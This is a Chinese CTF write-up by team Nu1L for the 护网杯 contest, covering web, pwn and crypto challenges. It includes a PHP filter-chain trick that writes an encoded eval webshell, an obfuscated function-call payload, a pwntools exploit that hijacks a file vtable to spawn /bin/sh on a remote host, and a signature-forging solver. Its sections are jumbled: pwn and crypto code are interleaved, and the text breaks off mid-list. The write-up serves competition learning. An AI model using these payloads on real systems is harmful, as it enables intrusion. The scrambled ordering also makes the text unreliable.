护网杯WP-Nu1L
护网杯WP-Nu1L
WEB
签到
SQLManager
SimpleCalculator
easyphp
Pwn
logger
Crypto
Signsystem
2EM
Re
gocrypt
WEB
签到
js里有
SQLManager
原题：https://www.anquanke.com/post/id/200927#h3-6
SimpleCalculator
国赛原题
easyphp
读源码/index.php?page=php://ﬁlter/read=convert.base64-encode/resource=index.php，绕过死亡
die，写入aPD9waHAgZXZhbCgkX1BPU1RbY10pOz8%2B。然后包含
page=php://ﬁlter/read=convert.base64-
decode/resource=sandbox/xxxxxxxx/aPD9waHAgZXZhbCgkX1BPU1RbY10pOz8%2B
Pwn
logger
?search=${~%A0%B8%BA%AB}[1](${~%A0%B8%BA%AB}[2])&1=phpinfo&2=0
from pwn import *
# context.log_level = 'debug'
# p = process('./logger')
p = remote('39.105.35.195', 15333)
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
def once(i,c):
    p.recvuntil('Exit')
    p.sendline('2')
    p.recvuntil('Content:')
    p.send(c + '\x00')
    p.recvuntil('ID:')
    p.sendline(str(i))
def pwarn(c):
    p.recvuntil('Exit')
    p.sendline('1')
    p.recvuntil('Content:')
    p.send(c)
def write_addr(addr,value):
    base = 0x67F7B0
    for i in xrange(len(value)):
        # if ord(value[i]) == 0: continue
        once(addr - base + i,'a' * ord(value[i]))
write_addr(0x67E020,p64(0x067F7A0))
pwarn('aa')
p.recvuntil('LOG: ')
leak = u64((''+ p.recvuntil(': aa',drop=True)).ljust(8,'\x00'))
log.info('leak libc ' + hex(leak))
# launch_gdb()
libc_base = leak - 3953984
environ = 3960632 + libc_base
io_vtable = 3954424 + libc_base
fake_io = libc_base + 3954115
write_addr(0x67f7b0,p64(fake_io))
write_addr(0x67f7b0 + 0xd8,p64(0x67f8b0))
'''
            Update with: $ gem update one_gadget && gem cleanup one_gadget
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
write_addr(0x67f8b0 + 0x38,p64(libc_base +0xf1207))
Crypto
Signsystem
本来以为是一个RSA的签名，没想到 encrypt 函数不是pow。
本地测试后，发现 encrypt(i, e, N) + encrypt(-i, e, N) == N 。
发一个-secret过去就能绕过check了，应该是个非预期。。
# log.info('environ : ' + hex(0x67F7B0))
write_addr(0x67F7A0,p64(0x67F7B0))
p.recvuntil('Exit')
p.sendline('4')
p.interactive()
# !/usr/bin/env python3
import re, string
from hashlib import sha256
from itertools import product
from pwn import *
r = remote("39.107.252.238", 10093)
context.log_level = 'debug'
# PoW
rec = r.recvline().decode()
suffix = re.findall(r'XXXX\+([^\)]+)', rec)[0]
digest = re.findall(r'== ([^\n]+)', rec)[0]
print(f"suffix: {suffix} \ndigest: {digest}")
print('Calculating hash...')
for i in product(string.ascii_letters + string.digits, repeat=4):
    prefix = ''.join(i)
    guess = prefix + suffix
    if sha256(guess.encode()).hexdigest() == digest:
        print(guess)
        break
r.sendafter(b'Give me XXXX:', prefix.encode())
e = 65537
r.recvuntil(b"65537 ")
n = int(r.recvline())
r.recvuntil(b"The secret is ")
secret = int(r.recvline())
print(n, secret)
r.sendlineafter(b"plaintext:", str(-secret).encode())
r.recvuntil(b"is ")
sig_neg = int(r.recvline())
sig = n - sig_neg
2EM
分析代码后，得到加密流程如下：
r.sendlineafter(b"plaintext:", str(0).encode())
r.sendlineafter(b"flag", str(sig).encode())
r.interactive()
xor key和pbox都是线性变化，可以用一个在GF(2)上的32*32的矩阵来表示，但是里面pbox1和pbox2
都是不可逆的，所以求不出这个矩阵。
看了一下key的位数也不是很大（才32位），encrypt函数在python里调用一下大概也就4.5微秒，48核
服务器，10min就能爆出来。
import multiprocessing as mp
from tqdm import tqdm
pbox1 = [22, 28, 2, 21, 3, 26, 6, 14, 7, 16, 15, 9, 17, 19, 8, 11, 10, 1, 13, 